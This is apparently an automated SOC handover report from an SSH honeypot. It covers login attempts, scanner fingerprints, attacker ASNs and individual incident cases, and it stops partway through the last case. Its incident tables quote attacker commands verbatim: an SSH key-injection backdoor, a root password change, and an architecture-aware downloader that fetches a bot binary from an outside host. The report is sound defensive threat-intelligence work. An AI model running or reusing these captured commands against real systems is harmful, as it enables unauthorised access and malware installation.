# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-31 |
| **Generated At** | 2026-05-31T23:04:04Z |
| **Shift Time** | 23:04 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **154** |
| Confirmed Threats | **153** |
| False Positives Filtered | **1** (0.7%) |
| Unique Attacker IPs | **24** |
| Countries of Origin | **14** |
| High Severity Cases | **31** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **123** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **70** |
| Unique Credential Pairs | **33** |
| Unique Usernames | **17** |
| Unique Passwords | **32** |
| Successful Auth Pairs | **22** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 35 |
| `345gs5662d34` | 14 |
| `dmdba` | 2 |
| `minecraft` | 2 |
| `postgres` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 14 |
| `3245gs5662d34` | 14 |
| `1234` | 3 |
| `dmdba` | 2 |
| `Abc1234!` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 14 |
| `root` | `3245gs5662d34` | 14 |
| `dmdba` | `dmdba` | 2 |
| `root` | `Abc1234!` | 2 |
| `minecraft` | `1234` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `password` | `185.220.177.34` | 2026-05-31T21:04:53 |
| `root` | `Abc1234!` | `85.159.4.32` | 2026-05-31T21:23:28 |
| `root` | `3245gs5662d34` | `85.159.4.32` | 2026-05-31T21:23:32 |
| `root` | `Aa123456!!` | `85.159.4.32` | 2026-05-31T21:27:44 |
| `root` | `speed@123` | `85.159.4.32` | 2026-05-31T21:30:27 |
| `root` | `Az123456` | `85.159.4.32` | 2026-05-31T21:33:13 |
| `root` | `Abcd1234@` | `89.252.131.17` | 2026-05-31T22:19:30 |
| `root` | `3245gs5662d34` | `89.252.131.17` | 2026-05-31T22:19:35 |
| `root` | `Az123456` | `46.70.206.6` | 2026-05-31T22:22:08 |
| `root` | `3245gs5662d34` | `46.70.206.6` | 2026-05-31T22:22:13 |
| `root` | `speed@123` | `46.70.206.6` | 2026-05-31T22:23:38 |
| `root` | `Aa123456!!` | `46.70.206.6` | 2026-05-31T22:26:39 |
| `root` | `teste` | `89.252.131.17` | 2026-05-31T22:28:16 |
| `root` | `Abc1234!` | `46.70.206.6` | 2026-05-31T22:29:29 |
| `root` | `Root_123` | `89.252.131.17` | 2026-05-31T22:29:45 |
| `root` | `azsxdcfv` | `183.82.111.224` | 2026-05-31T22:30:51 |
| `root` | `3245gs5662d34` | `183.82.111.224` | 2026-05-31T22:30:53 |
| `root` | `rootroot` | `89.252.131.17` | 2026-05-31T22:31:14 |
| `root` | `QAZ123wsx` | `172.172.170.199` | 2026-05-31T22:33:30 |
| `root` | `3245gs5662d34` | `172.172.170.199` | 2026-05-31T22:33:45 |
| `root` | `P` | `5.104.84.188` | 2026-05-31T22:49:19 |
| `root` | `test@12345` | `14.103.84.145` | 2026-05-31T23:02:14 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **154** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 73 |
| OpenSSH | 1 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 68 | 10 |
| `19532158b559...` | Mirai/variant | 3 | 1 |
| `03a80b21afa8...` | Modern SSH client | 2 | 2 |
| `f1e5e9d24e5e...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 68 | 10 | Mirai/variant |
| `19532158b559...` | libssh | 3 | 1 | Mirai/variant |
| `03a80b21afa8...` | libssh | 2 | 2 | Modern SSH client |
| `95420f9d932d...` | OpenSSH | 1 | 1 | — |
| `f1e5e9d24e5e...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 14 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:U12TwCoKtNR9"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.84.145`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `172.172.170.199`, `183.82.111.224`, `89.252.131.17`, `85.159.4.32`, `46.70.206.6`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **24** |
| Unique ASNs | **20** |
| High-Risk ASNs | **19** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS21859` | Zenlayer Inc | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | HIGH |
| `AS141995` | Contabo Asia Private Limited | 1 | MEDIUM |
| `AS31520` | Datagroup Retail | 1 | HIGH |
| `AS51559` | Netinternet Bilisim Teknolojileri AS | 1 | HIGH |
| `AS9329` | Sri Lanka Telecom Internet | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (31)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-02df6df428be

| Field | Detail |
|---|---|
| **Source IP** | `185.220.177[.]34` |
| **First Seen** | 2026-05-31 21:04 |
| **Last Seen** | 2026-05-31 21:05 |
| **Session Duration** | 47s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `arch=$(uname -m); case $arch in i386|i486|i586|i686) f="main_x86";; x86_64) f="main_x86_64";; mips) f="main_mips";; mipsel) f="main_mpsl";; armv4l|armv4tl) f="main_arm";; armv5l|armv5tel) f="main_arm5";; armv6l) f="main_arm6";; armv7l) f="main_arm7";; powerpc) f="main_ppc";; m68k) f="main_m68k";; sh4) f="main_sh4";; sparc) f="main_spc";; *) exit 1;; esac; if command -v wget >/dev/null; then wget -O /tmp/bot hxxp://skynet8.ydns.eu/$f; elif command -v curl >/dev/null; then curl -o /tmp/bot hxxp://skynet8.ydns, uname -m` |
| **TTPs (MITRE)** | T1078 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 21:04:52` | `cowrie.session.connect` |
| `2026-05-31 21:04:53` | `cowrie.login.success` |
| `2026-05-31 21:04:53` | `cowrie.session.params` |
| `2026-05-31 21:04:54` | `cowrie.command.input` |
| `2026-05-31 21:04:54` | `cowrie.command.input` |
| `2026-05-31 21:04:54` | `cowrie.command.failed` |
| `2026-05-31 21:04:54` | `cowrie.command.failed` |
| `2026-05-31 21:04:54` | `cowrie.command.failed` |
| `2026-05-31 21:04:54` | `cowrie.command.failed` |
| `2026-05-31 21:04:54` | `cowrie.command.failed` |
| `2026-05-31 21:04:54` | `cowrie.command.failed` |
| `2026-05-31 21:04:54` | `cowrie.command.failed` |
| `2026-05-31 21:04:54` | `cowrie.command.failed` |
| `2026-05-31 21:05:39` | `cowrie.log.closed` |
| `2026-05-31 21:05:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.220.177[.]34` to AbuseIPDB if not already reported
- [ ] Block `185.220.177[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61c68be196d9

| Field | Detail |
|---|---|
| **Source IP** | `85.159.4[.]32` |
| **First Seen** | 2026-05-31 21:23 |
| **Last Seen** | 2026-05-31 21:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 21:23:27` | `cowrie.session.connect` |
| `2026-05-31 21:23:27` | `cowrie.client.version` |
| `2026-05-31 21:23:27` | `cowrie.client.kex` |
| `2026-05-31 21:23:28` | `cowrie.login.success` |
| `2026-05-31 21:23:28` | `cowrie.session.params` |
| `2026-05-31 21:23:28` | `cowrie.command.input` |
| `2026-05-31 21:23:28` | `cowrie.command.failed` |
| `2026-05-31 21:23:29` | `cowrie.log.closed` |
| `2026-05-31 21:23:29` | `cowrie.session.params` |
| `2026-05-31 21:23:29` | `cowrie.command.input` |
| `2026-05-31 21:23:29` | `cowrie.session.file_download` |
| `2026-05-31 21:23:29` | `cowrie.log.closed` |
| `2026-05-31 21:23:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.159.4[.]32` to AbuseIPDB if not already reported
- [ ] Block `85.159.4[.]32` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ff6e6e5a4c1

| Field | Detail |
|---|---|
| **Source IP** | `85.159.4[.]32` |
| **First Seen** | 2026-05-31 21:23 |
| **Last Seen** | 2026-05-31 21:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 21:23:31` | `cowrie.session.connect` |
| `2026-05-31 21:23:31` | `cowrie.client.version` |
| `2026-05-31 21:23:32` | `cowrie.client.kex` |
| `2026-05-31 21:23:32` | `cowrie.login.success` |
| `2026-05-31 21:23:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.159.4[.]32` to AbuseIPDB if not already reported
- [ ] Block `85.159.4[.]32` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4830ac97353d

| Field | Detail |
|---|---|
| **Source IP** | `85.159.4[.]32` |
| **First Seen** | 2026-05-31 21:27 |
| **Last Seen** | 2026-05-31 21:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 21:27:43` | `cowrie.session.connect` |
| `2026-05-31 21:27:43` | `cowrie.client.version` |
| `2026-05-31 21:27:43` | `cowrie.client.kex` |
| `2026-05-31 21:27:44` | `cowrie.login.success` |
| `2026-05-31 21:27:44` | `cowrie.session.params` |
| `2026-05-31 21:27:44` | `cowrie.command.input` |
| `2026-05-31 21:27:44` | `cowrie.command.failed` |
| `2026-05-31 21:27:44` | `cowrie.log.closed` |
| `2026-05-31 21:27:45` | `cowrie.session.params` |
| `2026-05-31 21:27:45` | `cowrie.command.input` |
| `2026-05-31 21:27:45` | `cowrie.session.file_download` |
| `2026-05-31 21:27:45` | `cowrie.log.closed` |
| `2026-05-31 21:27:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.159.4[.]32` to AbuseIPDB if not already reported
- [ ] Block `85.159.4[.]32` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dc020dcc93f

| Field | Detail |
|---|---|
| **Source IP** | `85.159.4[.]32` |
| **First Seen** | 2026-05-31 21:27 |
| **Last Seen** | 2026-05-31 21:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 21:27:47` | `cowrie.session.connect` |
| `2026-05-31 21:27:47` | `cowrie.client.version` |
| `2026-05-31 21:27:47` | `cowrie.client.kex` |
| `2026-05-31 21:27:48` | `cowrie.login.success` |
| `2026-05-31 21:27:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.159.4[.]32` to AbuseIPDB if not already reported
- [ ] Block `85.159.4[.]32` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26a1e1d4a6f5

| Field | Detail |
|---|---|
| **Source IP** | `85.159.4[.]32` |
| **First Seen** | 2026-05-31 21:30 |
| **Last Seen** | 2026-05-31 21:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 21:30:26` | `cowrie.session.connect` |
| `2026-05-31 21:30:26` | `cowrie.client.version` |
| `2026-05-31 21:30:26` | `cowrie.client.kex` |
| `2026-05-31 21:30:27` | `cowrie.login.success` |
| `2026-05-31 21:30:27` | `cowrie.session.params` |
| `2026-05-31 21:30:27` | `cowrie.command.input` |
| `2026-05-31 21:30:27` | `cowrie.command.failed` |
| `2026-05-31 21:30:27` | `cowrie.log.closed` |
| `2026-05-31 21:30:28` | `cowrie.session.params` |
| `2026-05-31 21:30:28` | `cowrie.command.input` |
| `2026-05-31 21:30:28` | `cowrie.session.file_download` |
| `2026-05-31 21:30:28` | `cowrie.log.closed` |
| `2026-05-31 21:30:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.159.4[.]32` to AbuseIPDB if not already reported
- [ ] Block `85.159.4[.]32` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a9d6b0d8d4f

| Field | Detail |
|---|---|
| **Source IP** | `85.159.4[.]32` |
| **First Seen** | 2026-05-31 21:30 |
| **Last Seen** | 2026-05-31 21:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 21:30:30` | `cowrie.session.connect` |
| `2026-05-31 21:30:30` | `cowrie.client.version` |
| `2026-05-31 21:30:30` | `cowrie.client.kex` |
| `2026-05-31 21:30:31` | `cowrie.login.success` |
| `2026-05-31 21:30:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.159.4[.]32` to AbuseIPDB if not already reported
- [ ] Block `85.159.4[.]32` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd488a6e39d3

| Field | Detail |
|---|---|
| **Source IP** | `85.159.4[.]32` |
| **First Seen** | 2026-05-31 21:33 |
| **Last Seen** | 2026-05-31 21:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 21:33:12` | `cowrie.session.connect` |
| `2026-05-31 21:33:12` | `cowrie.client.version` |
| `2026-05-31 21:33:12` | `cowrie.client.kex` |
| `2026-05-31 21:33:13` | `cowrie.login.success` |
| `2026-05-31 21:33:13` | `cowrie.session.params` |
| `2026-05-31 21:33:13` | `cowrie.command.input` |
| `2026-05-31 21:33:13` | `cowrie.command.failed` |
| `2026-05-31 21:33:14` | `cowrie.log.closed` |
| `2026-05-31 21:33:14` | `cowrie.session.params` |
| `2026-05-31 21:33:14` | `cowrie.command.input` |
| `2026-05-31 21:33:14` | `cowrie.session.file_download` |
| `2026-05-31 21:33:14` | `cowrie.log.closed` |
| `2026-05-31 21:33:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.159.4[.]32` to AbuseIPDB if not already reported
- [ ] Block `85.159.4[.]32` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51a217753c7d

| Field | Detail |
|---|---|
| **Source IP** | `85.159.4[.]32` |
| **First Seen** | 2026-05-31 21:33 |
| **Last Seen** | 2026-05-31 21:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 21:33:16` | `cowrie.session.connect` |
| `2026-05-31 21:33:16` | `cowrie.client.version` |
| `2026-05-31 21:33:16` | `cowrie.client.kex` |
| `2026-05-31 21:33:17` | `cowrie.login.success` |
| `2026-05-31 21:33:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.159.4[.]32` to AbuseIPDB if not already reported
- [ ] Block `85.159.4[.]32` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3398d89ea8a0

| Field | Detail |
|---|---|
| **Source IP** | `89.252.131[.]17` |
| **First Seen** | 2026-05-31 22:19 |
| **Last Seen** | 2026-05-31 22:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 22:19:29` | `cowrie.session.connect` |
| `2026-05-31 22:19:29` | `cowrie.client.version` |
| `2026-05-31 22:19:29` | `cowrie.client.kex` |
| `2026-05-31 22:19:30` | `cowrie.login.success` |
| `2026-05-31 22:19:31` | `cowrie.session.params` |
| `2026-05-31 22:19:31` | `cowrie.command.input` |
| `2026-05-31 22:19:31` | `cowrie.command.failed` |
| `2026-05-31 22:19:31` | `cowrie.log.closed` |
| `2026-05-31 22:19:31` | `cowrie.session.params` |
| `2026-05-31 22:19:31` | `cowrie.command.input` |
| `2026-05-31 22:19:31` | `cowrie.session.file_download` |
| `2026-05-31 22:19:31` | `cowrie.log.closed` |
| `2026-05-31 22:19:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.252.131[.]17` to AbuseIPDB if not already reported
- [ ] Block `89.252.131[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-127941502999

| Field | Detail |
|---|---|
| **Source IP** | `89.252.131[.]17` |
| **First Seen** | 2026-05-31 22:19 |
| **Last Seen** | 2026-05-31 22:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 22:19:34` | `cowrie.session.connect` |
| `2026-05-31 22:19:34` | `cowrie.client.version` |
| `2026-05-31 22:19:34` | `cowrie.client.kex` |
| `2026-05-31 22:19:35` | `cowrie.login.success` |
| `2026-05-31 22:19:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.252.131[.]17` to AbuseIPDB if not already reported
- [ ] Block `89.252.131[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a056cba69209

| Field | Detail |
|---|---|
| **Source IP** | `46.70.206[.]6` |
| **First Seen** | 2026-05-31 22:22 |
| **Last Seen** | 2026-05-31 22:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

